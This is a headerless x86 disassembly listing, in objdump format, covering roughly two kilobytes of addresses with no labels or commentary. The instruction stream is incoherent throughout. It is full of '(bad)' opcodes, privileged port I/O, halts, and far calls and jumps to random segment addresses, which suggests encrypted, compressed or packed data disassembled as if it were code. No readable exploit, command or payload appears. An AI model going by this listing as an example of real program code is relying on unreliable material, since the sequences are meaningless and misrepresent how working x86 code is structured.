  416ed9:	xchg   ebp,eax
  416eda:	scas   al,BYTE PTR es:[edi]
  416edb:	test   al,0xef
  416edd:	adc    BYTE PTR [ecx+0x11],ch
  416ee0:	into   
  416ee1:	jns    0x416e7d
  416ee3:	jle    0x416eab
  416ee5:	ins    DWORD PTR es:[edi],dx
  416ee6:	sub    bh,ah
  416ee8:	cwde   
  416ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eea:	mov    ah,0x29
  416eec:	push   es
  416eed:	jno    0x416e76
  416eef:	sub    ecx,DWORD PTR [esp+eiz*2]
  416ef2:	mov    edx,0x2488cd9d
  416ef7:	daa    
  416ef8:	xchg   ebp,eax
  416ef9:	clc    
  416efa:	enter  0x85d2,0x98
  416efe:	shr    BYTE PTR [edi+0xcb7887],0xee
  416f05:	(bad)  
  416f06:	push   esi
  416f07:	shr    BYTE PTR [edx-0x4e],0x3c
  416f0b:	sub    BYTE PTR [ebx-0x6f14beb8],bl
  416f11:	popa   
  416f12:	je     0x416f86
  416f14:	bound  edi,QWORD PTR [edi+0x62]
  416f17:	fucom  st(7)
  416f19:	sbb    al,0xeb
  416f1b:	aas    
  416f1c:	sub    BYTE PTR [edi-0x5f],0x9e
  416f20:	mov    dl,0x37
  416f22:	or     ebx,DWORD PTR [ebx]
  416f24:	addr16 test al,0x1d
  416f27:	test   DWORD PTR [edx],edx
  416f29:	int    0xa2
  416f2b:	add    DWORD PTR [edx],ebp
  416f2d:	fnstenv [eax-0x27]
  416f30:	pop    eax
  416f31:	pushf  
  416f32:	add    eax,0xb42d1fd6
  416f37:	rol    BYTE PTR [eax+ebp*4],0x64
  416f3b:	sbb    ch,BYTE PTR [esi+0x5100ba7]
  416f41:	dec    esi
  416f42:	and    eax,0x5099ba86
  416f47:	ret    
  416f48:	push   esp
  416f49:	mov    dh,0xd7
  416f4b:	jne    0x416f58
  416f4d:	call   0x55e0:0xf324ed40
  416f54:	out    dx,eax
  416f55:	sub    DWORD PTR [esi+0x51],0xf6215fbf
  416f5c:	push   eax
  416f5d:	jo     0x416f5d
  416f5f:	lods   al,BYTE PTR ds:[esi]
  416f60:	clc    
  416f61:	xor    edx,DWORD PTR [esi+edi*1+0x6d]
  416f65:	xor    al,0xda
  416f67:	(bad)  
  416f68:	rcl    DWORD PTR [edx+0x2ef4aafe],1
  416f6e:	mov    ds:0x247b5f77,al
  416f73:	shl    BYTE PTR [edx+0x378787f7],cl
  416f79:	jne    0x416f36
  416f7b:	inc    edi
  416f7c:	cld    
  416f7d:	mov    eax,ds:0x650b99fe
  416f82:	pop    ebx
  416f83:	outs   dx,DWORD PTR ds:[esi]
  416f84:	je     0x416f39
  416f86:	add    al,0xf7
  416f88:	ja     0x416f6e
  416f8a:	mov    dl,0xd
  416f8c:	clc    
  416f8d:	into   
  416f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f8f:	lea    ebp,[ecx]
  416f91:	mov    dh,0x96
  416f93:	enter  0x84ad,0x1d
  416f97:	sar    DWORD PTR ds:[ebp-0xdbcb0d4],0x74
  416f9f:	(bad)  
  416fa0:	in     eax,0x19
  416fa2:	fmul   QWORD PTR [ebx+ebx*8-0xd17876b]
  416fa9:	test   DWORD PTR [ecx+0x2c767465],ebx
  416faf:	cmp    eax,DWORD PTR [ebx]
  416fb1:	push   edx
  416fb2:	sbb    dh,BYTE PTR [eax]
  416fb4:	xchg   edi,eax
  416fb5:	clc    
  416fb6:	adc    eax,0x9b9d9352
  416fbb:	mov    bl,0xc
  416fbd:	hlt    
  416fbe:	mov    edx,edi
  416fc0:	es jae 0x416f9d
  416fc3:	cmp    bh,BYTE PTR [edx]
  416fc5:	sbb    ebx,eax
  416fc7:	jb     0x416faf
  416fc9:	pop    ds
  416fca:	sti    
  416fcb:	into   
  416fcc:	inc    edx
  416fcd:	sub    eax,DWORD PTR [esi]
  416fcf:	sbb    DWORD PTR [esi],0x57fc31e0
  416fd5:	sbb    DWORD PTR [esi],esi
  416fd7:	mov    eax,0x45f735c5
  416fdc:	div    BYTE PTR [eax-0x10]
  416fdf:	sbb    bl,BYTE PTR [eax+0x6ce05c64]
  416fe5:	cmp    bl,BYTE PTR [eax]
  416fe7:	das    
  416fe8:	aas    
  416fe9:	jp     0x416fe0
  416feb:	pop    esi
  416fec:	(bad)  
  416fed:	sti    
  416fee:	xchg   esp,eax
  416fef:	es fwait
  416ff1:	xor    DWORD PTR [ebx-0x539266f2],ecx
  416ff7:	inc    edi
  416ff8:	mov    ebp,0x97dccc2b
  416ffd:	fld    QWORD PTR [ebx]
  416fff:	sar    al,0x5
  417002:	lahf   
  417003:	ds push ecx
  417005:	int    0x3
  417007:	(bad)  
  417009:	cmp    DWORD PTR [ebp-0x4156e5cc],esp
  41700f:	push   edi
  417010:	popa   
  417011:	(bad)  
  417012:	dec    ebx
  417013:	lods   al,BYTE PTR ds:[esi]
  417014:	pop    edi
  417015:	test   edi,edx
  417017:	loope  0x416ff3
  417019:	and    eax,0xb38a17f4
  41701e:	push   edi
  41701f:	mov    edx,0xf9c0435b
  417024:	adc    al,0x92
  417026:	jle    0x416fe8
  417028:	nop
  417029:	ret    0x2ff
  41702c:	and    BYTE PTR [ebx-0x4c],al
  41702f:	fxch   st(2)
  417031:	mov    DWORD PTR ds:0x79538b1c,edx
  417037:	fistp  WORD PTR [esi+eax*1+0x72]
  41703b:	out    0xe4,al
  41703d:	out    dx,al
  41703e:	xor    al,0x78
  417040:	inc    esp
  417041:	push   ecx
  417042:	xchg   edi,eax
  417043:	mov    ecx,0xddae19c0
  417048:	mov    bl,0x12
  41704a:	mov    eax,0x551216bf
  41704f:	call   0xbc385653
  417054:	pop    esi
  417055:	mov    edx,0xe99397a1
  41705a:	and    al,bl
  41705c:	fist   WORD PTR [edi]
  41705e:	(bad)  
  41705f:	retf   0x6236
  417062:	bound  esi,QWORD PTR ds:0xd34d35bb
  417068:	cmp    edx,esp
  41706a:	pop    ecx
  41706b:	ds data16 shl ch,0x21
  417070:	clc    
  417071:	mov    esp,DWORD PTR ds:0xc492643c
  417077:	out    dx,eax
  417078:	adc    al,0x29
  41707a:	xchg   ebp,eax
  41707b:	xchg   edx,eax
  41707c:	mov    ecx,0x90e300c
  417081:	add    esp,eax
  417083:	push   cs
  417084:	popf   
  417085:	xchg   ebx,eax
  417086:	mov    esp,0xd8cd1a19
  41708b:	mov    ebp,0x689026d2
  417090:	mov    DWORD PTR [esi+0x1],ebp
  417093:	or     eax,DWORD PTR [ebp+0x74]
  417096:	or     BYTE PTR [eax],dh
  417098:	data16 cmc 
  41709a:	ja     0x41701e
  41709c:	fsub   QWORD PTR [eax-0x64fa5f91]
  4170a2:	mov    ebp,0x4f622ccc
  4170a7:	adc    esp,DWORD PTR [ebp+esi*4-0x70]
  4170ab:	mov    al,ds:0x2132b6b9
  4170b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170b1:	cld    
  4170b2:	mov    DWORD PTR [ecx-0x63bfd86e],ebx
  4170b8:	xor    eax,0x52387721
  4170bd:	pop    es
  4170be:	das    
  4170bf:	jle    0x4170d1
  4170c1:	mov    edi,0xc136da7a
  4170c6:	enter  0x26f2,0xf4
  4170ca:	cs inc edx
  4170cc:	adc    al,bl
  4170ce:	push   es
  4170cf:	or     ebp,DWORD PTR [edx+esi*4+0x75]
  4170d3:	xor    ebp,DWORD PTR ds:0xfe6bea76
  4170d9:	bound  ebp,QWORD PTR [esi]
  4170db:	dec    ebp
  4170dc:	push   cs
  4170dd:	ins    BYTE PTR es:[edi],dx
  4170de:	lods   al,BYTE PTR ds:[esi]
  4170df:	push   0xffffffae
  4170e1:	daa    
  4170e2:	enter  0x7802,0xf8
  4170e6:	pop    ebx
  4170e7:	into   
  4170e8:	sub    eax,0x51c2ca
  4170ed:	xlat   BYTE PTR ds:[ebx]
  4170ee:	pop    edx
  4170ef:	ins    BYTE PTR es:[edi],dx
  4170f0:	mov    bl,0xcf
  4170f2:	pop    es
  4170f3:	mov    gs,WORD PTR [edx+0x18d1c5d9]
  4170f9:	(bad)  
  4170fa:	cdq    
  4170fb:	scas   al,BYTE PTR es:[edi]
  4170fc:	rol    BYTE PTR [ecx+0xe],0x10
  417100:	shr    DWORD PTR [edi+0x7a],0xc4
  417104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417105:	and    ebx,edi
  417107:	sub    bl,dh
  417109:	(bad)  
  41710a:	and    eax,0xeefeaca4
  41710f:	gs xchg ebp,eax
  417111:	jecxz  0x417176
  417113:	mov    ecx,0x3b3c66f0
  417118:	gs dec ebp
  41711a:	xchg   edi,eax
  41711b:	or     al,0x58
  41711d:	test   eax,0x219fb7c9
  417122:	cmp    al,0xc0
  417124:	inc    ebx
  417125:	jmp    0x4150c2ab
  41712a:	mov    ebx,0xb65ecfee
  41712f:	sub    al,ch
  417131:	daa    
  417132:	idiv   BYTE PTR [ebx]
  417134:	inc    esi
  417135:	add    DWORD PTR [ebx],0xffffff8f
  417138:	add    al,BYTE PTR [esi+0x5d426fe7]
  41713e:	lods   eax,DWORD PTR ds:[esi]
  41713f:	xor    esp,edx
  417141:	inc    BYTE PTR [edi]
  417143:	mov    ds:0x1d3e0d79,al
  417148:	xchg   ebp,eax
  417149:	out    dx,al
  41714a:	retf   
  41714b:	out    0x60,eax
  41714d:	hlt    
  41714e:	ds mov ah,0x2f
  417151:	ror    DWORD PTR [ebx+0x73cbe37a],0xf2
  417158:	rol    dh,cl
  41715a:	loope  0x4170dc
  41715c:	fadd   DWORD PTR [esi+0x54000915]
  417162:	out    dx,eax
  417163:	mov    edi,esp
  417165:	into   
  417166:	into   
  417167:	pop    edi
  417168:	jl     0x4171a0
  41716a:	aas    
  41716b:	sub    al,0x95
  41716d:	and    al,0x17
  41716f:	dec    eax
  417170:	loope  0x417141
  417172:	pop    ecx
  417173:	scas   al,BYTE PTR es:[edi]
  417174:	(bad)  
  417176:	mov    ?,eax
  417178:	inc    ebx
  417179:	enter  0x1177,0x8b
  41717d:	ins    BYTE PTR es:[edi],dx
  41717e:	inc    ebp
  41717f:	adc    edi,esi
  417181:	clc    
  417182:	(bad)  
  417183:	hlt    
  417184:	mov    al,0x6f
  417186:	inc    ebx
  417187:	mov    dh,0x48
  417189:	mov    ebp,0xdd2d29ca
  41718e:	test   BYTE PTR [edx],ch
  417190:	jb     0x417153
  417192:	dec    eax
  417193:	adc    eax,0x2ceb2f05
  417198:	call   0xbad0df61
  41719d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41719e:	inc    esp
  41719f:	inc    edi
  4171a0:	cld    
  4171a1:	jbe    0x4171bb
  4171a3:	adc    DWORD PTR ds:0x843f2646,ebx
  4171a9:	les    eax,FWORD PTR [eax]
  4171ab:	mov    bh,0x38
  4171ad:	(bad)  
  4171ae:	push   esi
  4171af:	mov    dl,0xd8
  4171b1:	dec    esi
  4171b2:	jg     0x417201
  4171b4:	inc    ecx
  4171b5:	cmp    al,0x7
  4171b7:	lods   eax,DWORD PTR ds:[esi]
  4171b8:	mov    esp,0x54ca3a1c
  4171bd:	ins    DWORD PTR es:[edi],dx
  4171be:	clc    
  4171bf:	push   0x99c4d52a
  4171c4:	data16 in al,0x4d
  4171c7:	rcr    DWORD PTR [ebp-0x1d319e2e],1
  4171cd:	or     al,0xa6
  4171cf:	out    0x8b,al
  4171d1:	mov    al,0xa0
  4171d3:	push   0xffffff9f
  4171d5:	in     al,dx
  4171d6:	inc    edx
  4171d7:	sbb    BYTE PTR [ebx],bh
  4171d9:	push   ecx
  4171da:	pusha  
  4171db:	and    cl,BYTE PTR [esi+0x29]
  4171de:	(bad)  
  4171df:	or     eax,0x751c7836
  4171e4:	fcom   QWORD PTR [edx+0x784b3e13]
  4171ea:	(bad)  
  4171eb:	jp     0x417188
  4171ed:	fist   DWORD PTR [edx+0x26]
  4171f0:	scas   eax,DWORD PTR es:[edi]
  4171f1:	rol    BYTE PTR [ecx],1
  4171f3:	cwde   
  4171f4:	(bad)  
  4171f5:	mov    esp,0x438109bb
  4171fa:	repz pop ecx
  4171fc:	inc    edx
  4171fd:	mov    ebx,0xcab9d4e4
  417203:	fsub   st(5),st
  417205:	pop    ss
  417206:	mov    ds:0xbbdcca6c,al
  41720b:	loop   0x4171ef
  41720d:	dec    eax
  41720e:	xchg   ecx,eax
  41720f:	dec    ecx
  417210:	mov    ?,WORD PTR [ecx-0x4d912cfc]
  417216:	jg     0x4171ee
  417218:	adc    edi,eax
  41721a:	aad    0xea
  41721c:	mov    bh,0x88
  41721e:	mov    al,0x79
  417220:	enter  0xd14f,0xcf
  417224:	mul    DWORD PTR [eax+0x1f703dd1]
  41722a:	es push ebx
  41722c:	and    esi,DWORD PTR [esi+ecx*4+0x13d039c9]
  417233:	sub    dh,0x22
  417236:	adc    eax,0x41358507
  41723b:	arpl   WORD PTR [ebp-0x59],ax
  41723e:	nop
  41723f:	sub    BYTE PTR [esi-0x3e],cl
  417242:	cmc    
  417243:	test   eax,0x7a4bda3d
  417248:	xchg   esi,eax
  417249:	mov    ebx,0x35dc43f4
  41724e:	sbb    BYTE PTR [edi-0x46e335c5],dh
  417254:	sub    al,0x71
  417256:	xor    eax,0x2d286513
  41725b:	jbe    0x4171f9
  41725d:	add    BYTE PTR [esi+eax*4+0x51],cl
  417261:	imul   edx,DWORD PTR [eax-0x525a36c7],0x666b2c72
  41726b:	fisubr WORD PTR [ecx+0x4246ef3e]
  417271:	inc    esp
  417272:	push   edi
  417273:	mov    ds:0x4a944b77,eax
  417278:	(bad)  
  417279:	mov    ebx,0x4ca87459
  41727e:	add    cl,BYTE PTR [eax+esi*4+0x5c]
  417282:	xor    dl,dh
  417284:	in     eax,dx
  417285:	(bad)  
  417286:	outs   dx,DWORD PTR ds:[esi]
  417287:	jp     0x4172b0
  417289:	jns    0x4172fe
  41728b:	fldenv [edx+0x32b061ce]
  417291:	aad    0x9e
  417293:	xor    eax,0x43d53804
  417298:	popf   
  417299:	xor    al,0x58
  41729b:	test   esi,0x8f9e7ecc
  4172a1:	gs adc al,0xa8
  4172a4:	sbb    al,0xe6
  4172a6:	repnz pop ecx
  4172a8:	enter  0xd7e5,0x29
  4172ac:	jns    0x417316
  4172ae:	adc    BYTE PTR [edi+0x361ed677],0x84
  4172b5:	mov    eax,ds:0x7a925c09
  4172ba:	sbb    ebx,DWORD PTR [edi+eax*2]
  4172bd:	dec    ebp
  4172be:	xor    al,BYTE PTR [ebx-0x6b]
  4172c1:	rol    BYTE PTR [esp+eax*4-0x36d27624],0xc6
  4172c9:	pusha  
  4172ca:	sbb    esp,DWORD PTR [edi+0x42cd7932]
  4172d0:	mov    ebx,0x821a7858
  4172d5:	and    cl,BYTE PTR [ebx+0x1e8a30a7]
  4172db:	xor    ebp,DWORD PTR [ebx]
  4172dd:	enter  0x83cb,0x1e
  4172e1:	mov    ch,0x47
  4172e3:	stos   DWORD PTR es:[edi],eax
  4172e4:	mov    ah,0xdf
  4172e6:	nop
  4172e7:	adc    edx,DWORD PTR [esp+edx*2+0x12f6f3c5]
  4172ee:	lds    eax,FWORD PTR [ecx+0x189fda35]
  4172f4:	enter  0x91a2,0x75
  4172f8:	lods   eax,DWORD PTR ds:[esi]
  4172f9:	inc    ebx
  4172fa:	cmp    al,0x3c
  4172fc:	cdq    
  4172fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fe:	ficomp WORD PTR [eax-0x10]
  417301:	fcomp  DWORD PTR [ebx+0x16]
  417304:	stos   DWORD PTR es:[edi],eax
  417305:	hlt    
  417306:	pusha  
  417307:	xor    al,BYTE PTR [esi-0x17]
  41730a:	pop    ds
  41730b:	jge    0x417303
  41730d:	xor    DWORD PTR [edx-0x1e],edx
  417310:	iret   
  417311:	push   0xc
  417313:	es push ebp
  417315:	sub    dl,cl
  417317:	retf   0xa884
  41731a:	adc    edi,DWORD PTR [edi-0x4dbbbaf7]
  417320:	mov    dh,0xa3
  417322:	ret    
  417323:	xor    edi,DWORD PTR ds:0xd1998e51
  417329:	push   0x36e95cbe
  41732e:	and    cl,dl
  417330:	hlt    
  417331:	ret    0x136e
  417334:	mov    eax,ds:0x43eb933e
  417339:	or     BYTE PTR [ecx+0x67ec0bfc],dl
  41733f:	mov    ah,0xa9
  417341:	xor    DWORD PTR [eax],ecx
  417343:	cmc    
  417344:	call   0xf9b3964e
  417349:	repnz scas eax,DWORD PTR es:[edi]
  41734b:	sahf   
  41734c:	sbb    edx,0x88233192
  417352:	sub    eax,0x174a6186
  417357:	sar    al,1
  417359:	call   0xabc7:0x555bdfab
  417360:	std    
  417361:	jns    0x417394
  417363:	pop    ebp
  417364:	and    DWORD PTR [ebp-0x1551d0f7],ebx
  41736a:	(bad)  
  41736b:	sbb    ebp,DWORD PTR [eax]
  41736d:	out    dx,eax
  41736e:	mov    eax,ds:0x7548c237
  417373:	call   0x2887aeba
  417378:	out    dx,eax
  417379:	hlt    
  41737a:	les    ebp,FWORD PTR [edi]
  41737c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41737d:	bnd jb 0x417386
  417380:	inc    BYTE PTR [esi+0x4859a282]
  417386:	scas   al,BYTE PTR es:[edi]
  417387:	pop    edx
  417388:	push   esi
  417389:	stc    
  41738a:	mov    bl,0xe6
  41738c:	dec    edx
  41738d:	mov    cl,0x31
  41738f:	int3   
  417390:	cdq    
  417391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417392:	scas   al,BYTE PTR es:[edi]
  417393:	xor    BYTE PTR [bx+si-0x64],al
  417397:	push   esi
  417398:	in     eax,0xc0
  41739a:	xlat   BYTE PTR ds:[ebx]
  41739b:	ds xchg bh,ch
  41739e:	pushf  
  41739f:	jge    0x4173c1
  4173a1:	push   ecx
  4173a2:	das    
  4173a3:	cwde   
  4173a4:	xchg   esp,eax
  4173a5:	xlat   BYTE PTR ds:[ebx]
  4173a6:	movsx  ebx,BYTE PTR [esi-0x344759f1]
  4173ad:	and    edi,ebp
  4173af:	das    
  4173b0:	or     esp,edx
  4173b2:	hlt    
  4173b3:	sbb    al,0x44
  4173b5:	in     al,0x6a
  4173b7:	es mov edi,0x312a7ff8
  4173bd:	sub    ebp,DWORD PTR [esi-0x51a5efd]
  4173c3:	push   es
  4173c4:	mov    cl,dh
  4173c6:	sbb    eax,0x4181a139
  4173cb:	jle    0x4173f8
  4173cd:	add    esi,eax
  4173cf:	add    dh,BYTE PTR [esi+0x415bcbc]
  4173d5:	(bad)  [edx]
  4173d7:	test   eax,0x746cf5e1
  4173dc:	jmp    0xfd02:0x7f4093cb
  4173e3:	inc    esi
  4173e4:	outs   dx,DWORD PTR ds:[esi]
  4173e5:	leave  
  4173e6:	jns    0x417458
  4173e8:	popw   ds
  4173ea:	xchg   BYTE PTR [edi+0x768c2219],al
  4173f0:	(bad)
  4173f3:	out    0xfc,al
  4173f5:	and    DWORD PTR [eax+0x27],edx
  4173f8:	lods   eax,DWORD PTR ds:[esi]
  4173f9:	(bad)  
  4173fa:	push   esp
  4173fb:	cmc    
  4173fc:	mov    cl,0x4d
  4173fe:	test   eax,0x55e71523
  417403:	nop
  417404:	fst    DWORD PTR [ebx-0xcd2b9b4]
  41740a:	mov    cl,0x31
  41740c:	inc    esp
  41740d:	jne    0x417423
  41740f:	xor    edi,DWORD PTR [edi-0xc]
  417412:	ds pop ds
  417414:	ret    0x92b3
  417417:	push   0xffffffcd
  417419:	test   DWORD PTR [edx+edx*1+0x42d30050],esi
  417420:	sti    
  417421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417422:	outs   dx,DWORD PTR ds:[esi]
  417423:	lds    edi,FWORD PTR [esi+0x64]
  417426:	arpl   di,di
  417428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417429:	es jb  0x41747a
  41742c:	adc    eax,0x55b9fa7b
  417431:	inc    edx
  417432:	cwde   
  417433:	sbb    ebp,0x6141a611
  417439:	or     ebp,ecx
  41743b:	pushf  
  41743c:	jg     0x4173ee
  41743e:	das    
  41743f:	xor    al,0x60
  417441:	in     eax,0x69
  417443:	dec    esi
  417444:	and    dl,ch
  417446:	fs out dx,al
  417448:	sbb    ch,al
  41744a:	jno    0x417462
  41744c:	and    esi,ebx
  41744e:	shl    bl,0x1
  417451:	xor    eax,0xd427e818
  417456:	gs retf 0xdf77
  41745a:	push   DWORD PTR [edx+0x9f9dc99]
  417460:	inc    eax
  417461:	adc    eax,0x3e2787b
  417466:	jmp    eax
  417468:	std    
  417469:	dec    ebp
  41746a:	or     BYTE PTR [ebx-0x7aad113e],dh
  417470:	sbb    bh,BYTE PTR [ecx-0x758c4691]
  417476:	ins    BYTE PTR es:[edi],dx
  417477:	jbe    0x4174a2
  417479:	push   edx
  41747a:	sbb    dh,BYTE PTR [esi-0x2e]
  41747d:	pusha  
  41747e:	lock mov edx,0xaac503a5
  417484:	pop    ds
  417485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417486:	not    edx
  417488:	int3   
  417489:	xchg   edi,eax
  41748a:	scas   al,BYTE PTR es:[edi]
  41748b:	xor    ah,BYTE PTR [esp]
  41748e:	xchg   ecx,eax
  41748f:	shl    BYTE PTR [edi],cl
  417491:	jecxz  0x417498
  417493:	mov    ebx,0x18eed823
  417498:	pusha  
  417499:	push   esi
  41749a:	sub    al,0x4
  41749c:	fist   WORD PTR [eax+edx*1-0x80]
  4174a0:	xlat   BYTE PTR ds:[ebx]
  4174a1:	mov    BYTE PTR [edx],dl
  4174a3:	cld    
  4174a4:	stos   BYTE PTR es:[edi],al
  4174a5:	add    DWORD PTR [ebp+eax*8+0x50],edi
  4174a9:	pop    eax
  4174aa:	inc    edx
  4174ab:	gs stos BYTE PTR es:[edi],al
  4174ad:	ds cdq 
  4174af:	xor    cl,dl
  4174b1:	mov    bh,0x6c
  4174b3:	rcr    DWORD PTR [esi-0x5a9f946e],cl
  4174b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174ba:	or     BYTE PTR [edi],dl
  4174bc:	push   esi
  4174bd:	sub    dh,BYTE PTR [eax+0x5ae39e3f]
  4174c3:	mul    DWORD PTR [esp+eax*4+0x72]
  4174c7:	inc    ebx
  4174c8:	push   esp
  4174c9:	pop    ebp
  4174ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174cb:	stos   BYTE PTR es:[edi],al
  4174cc:	mov    bh,0xe0
  4174ce:	cmp    DWORD PTR [edi+eiz*2-0x74],edx
  4174d2:	mov    edi,0x4a1efec3
  4174d7:	push   edx
  4174d8:	or     eax,0x77cdaef5
  4174dd:	and    BYTE PTR [edx-0x27],dh
  4174e0:	push   ebx
  4174e1:	daa    
  4174e2:	sub    BYTE PTR [ecx+eiz*8-0x706b5ab0],dh
  4174e9:	in     eax,0xf0
  4174eb:	in     eax,dx
  4174ec:	adc    ecx,esp
  4174ee:	sbb    esi,DWORD PTR [edi+0x18b49dcd]
  4174f4:	fs test eax,0x427ae17c
  4174fa:	sbb    al,0xfb
  4174fc:	repz inc ecx
  4174fe:	cwde   
  4174ff:	jae    0x4174a3
  417501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417502:	cmp    al,bl
  417504:	in     eax,dx
  417505:	in     eax,dx
  417506:	pusha  
  417507:	mov    ebp,0x40a90a03
  41750c:	mov    esp,DWORD PTR [ecx+0x78]
  41750f:	dec    edi
  417510:	sub    ebx,ebx
  417512:	mov    ds:0xf97f3074,eax
  417517:	or     eax,0xf2af76e0
  41751c:	dec    ch
  41751e:	int    0x13
  417520:	adc    ecx,DWORD PTR [ecx-0xe3102f7]
  417526:	lahf   
  417527:	sar    BYTE PTR [eax-0x47],0x99
  41752b:	not    DWORD PTR [ebp+edi*8+0x11]
  41752f:	mov    ds:0xee88562b,eax
  417534:	in     eax,0x6a
  417536:	xor    edi,DWORD PTR [ebx+ecx*8]
  417539:	push   eax
  41753a:	or     BYTE PTR [edx+edi*2-0x24ec4fc5],ch
  417541:	(bad)  
  417544:	xchg   edi,eax
  417545:	sbb    eax,0x9c5604c8
  41754a:	fs sti 
  41754c:	add    eax,0xf17e436a
  417551:	lods   eax,DWORD PTR ds:[esi]
  417552:	mov    al,BYTE PTR [esi-0x32]
  417555:	jle    0x417504
  417557:	fs dec edx
  417559:	call   0x953c:0x908bb13b
  417560:	stos   DWORD PTR es:[edi],eax
  417561:	mov    eax,ds:0x31e4d9ee
  417566:	sbb    ebx,ebx
  417568:	out    0x86,al
  41756a:	in     al,0xe8
  41756c:	sub    eax,0x79214d00
  417571:	cld    
  417572:	cmp    dh,dl
  417574:	xchg   al,dh
  417576:	mov    DWORD PTR [ecx+eiz*1],ebx
  417579:	in     eax,dx
  41757a:	push   0x85e4508e
  41757f:	aaa    
  417580:	mov    bh,0xa9
  417582:	jno    0x4175dc
  417584:	mov    ax,ds:0x57392e04
  41758a:	fucomip st,st(5)
  41758c:	mov    al,0xc1
  41758e:	push   esi
  41758f:	jo     0x417539
  417591:	daa    
  417592:	inc    DWORD PTR [esi]
  417594:	int3   
  417595:	sub    dl,BYTE PTR [edi+0x7fb5f66f]
  41759b:	ss sti 
  41759d:	(bad)  
  41759e:	jge    0x4175b8
  4175a0:	retf   0x9fce
  4175a3:	inc    edi
  4175a4:	xor    BYTE PTR [esi],dl
  4175a6:	scas   eax,DWORD PTR es:[edi]
  4175a7:	cmp    esi,DWORD PTR [ebx]
  4175a9:	imul   esi,DWORD PTR [eax+0x5779689e],0x1e
  4175b0:	jg     0x41755e
  4175b2:	retf   
  4175b3:	std    
  4175b4:	inc    ebx
  4175b5:	push   0x5b
  4175b7:	sub    al,dh
  4175b9:	mov    esi,0x532c38de
  4175be:	test   BYTE PTR [edi],ch
  4175c0:	cs loope 0x4175a3
  4175c3:	jp     0x4175d4
  4175c5:	xor    al,0xed
  4175c7:	adc    DWORD PTR [esi+0x7e],ebp
  4175ca:	mov    eax,0x5c67f987
  4175cf:	xchg   esp,eax
  4175d0:	ret    0xd060
  4175d3:	dec    ebp
  4175d4:	jmp    0xf04d:0xc4e6f42b
  4175db:	das    
  4175dc:	xchg   ebp,eax
  4175dd:	mov    cl,0x89
  4175df:	aad    0x87
  4175e1:	jno    0x4175c0
  4175e3:	daa    
  4175e4:	adc    esp,DWORD PTR [edi+0x2eb0b04a]
  4175ea:	and    BYTE PTR [ebx+0x47],0x3
  4175ee:	inc    edi
  4175ef:	sbb    DWORD PTR [ebx-0x70],esi
  4175f2:	or     al,0xc6
  4175f4:	(bad)  [eax+0x385cb7a9]
  4175fa:	push   0xffffffee
  4175fc:	cmc    
  4175fd:	jo     0x417633
  4175ff:	or     BYTE PTR [ebp-0x25b4139a],0xdb
  417606:	mov    dh,BYTE PTR [edi+0x33]
  417609:	ja     0x417633
  41760b:	and    edi,eax
  41760d:	mov    dh,0x75
  41760f:	fdiv   DWORD PTR [edi+0x159cbc80]
  417615:	daa    
  417616:	jnp    0x41764e
  417618:	jns    0x4175e0
  41761a:	sub    eax,0xa965ef8
  41761f:	ja     0x4175cb
  417621:	sbb    BYTE PTR [edx-0x9],bh
  417624:	and    BYTE PTR [ebp+0x679f49da],al
  41762a:	popf   
  41762b:	push   esp
  41762c:	add    dh,BYTE PTR [esi+0x1738b14f]
  417632:	jno    0x4175e6
  417634:	push   eax
  417635:	xchg   edi,eax
  417636:	std    
  417637:	pop    ss
  417638:	mov    ds:0xaf4331d3,al
  41763d:	mov    esi,0xa5764bc1
  417642:	shl    DWORD PTR [edi-0x64b141d3],1
  417648:	pop    ds
  417649:	pop    ecx
  41764a:	push   cs
  41764b:	enter  0x5739,0x49
  41764f:	nop
  417650:	imul   ebx,DWORD PTR [ecx+ecx*1],0x161a600e
  417657:	dec    ecx
  417658:	xchg   ebx,eax
  417659:	js     0x4176a2
  41765b:	inc    esp
  41765c:	(bad)  
  41765d:	dec    ebp
  41765e:	dec    esi
  41765f:	fsub   DWORD PTR [ebp+0x1]
  417662:	jge    0x417680
  417664:	xor    eax,0x2421c0b4
  417669:	add    eax,0xd5bd94fb
  41766e:	cmp    dl,bl
  417670:	aas    
  417671:	mov    ebx,0xd1bfaf7f
  417676:	js     0x4176d6
  417678:	dec    ecx
  417679:	push   0x3ef8cfa0
  41767e:	jae    0x417618
  417680:	dec    edi
  417681:	test   BYTE PTR [edi],bl
  417683:	jge    0x4176ea
  417685:	jns    0x4176e5
  417687:	mov    dh,0xdd
  417689:	cli    
  41768a:	sbb    BYTE PTR [ebp-0x48],bh
  41768d:	ins    BYTE PTR es:[edi],dx
  41768e:	enter  0xe549,0x7d
  417692:	dec    esp
  417693:	dec    esp
  417694:	and    BYTE PTR [ebx+eiz*1+0x457a0f01],ah
  41769b:	push   0x34
  41769d:	jg     0x4176db
  41769f:	pop    ds
  4176a0:	xor    DWORD PTR [ecx+0x4d533d42],0x8b5a0429
  4176aa:	outs   dx,BYTE PTR ds:[esi]
  4176ab:	ja     0x41771b
  4176ad:	ja     0x4176f2
  4176af:	adc    al,0x3d
  4176b1:	mov    WORD PTR [edi+0x2610005b],?
  4176b7:	test   al,0x9e
  4176b9:	out    dx,al
  4176ba:	ja     0x4176da
  4176bc:	fwait
  4176bd:	outs   dx,DWORD PTR ds:[esi]
  4176be:	inc    ebp
  4176bf:	mov    ds:0x3b9673d0,eax
  4176c4:	cli    
  4176c5:	sub    eax,0xdb9de9b6
  4176ca:	add    bl,BYTE PTR [edi+0x7f]
  4176cd:	mov    cl,BYTE PTR [esi]
  4176cf:	xchg   edi,eax
  4176d0:	dec    esp
  4176d1:	addr16 (bad) 
  4176d3:	fnstsw WORD PTR [ecx-0x5a90a2c1]
  4176d9:	dec    edx
  4176da:	mov    dh,0x82
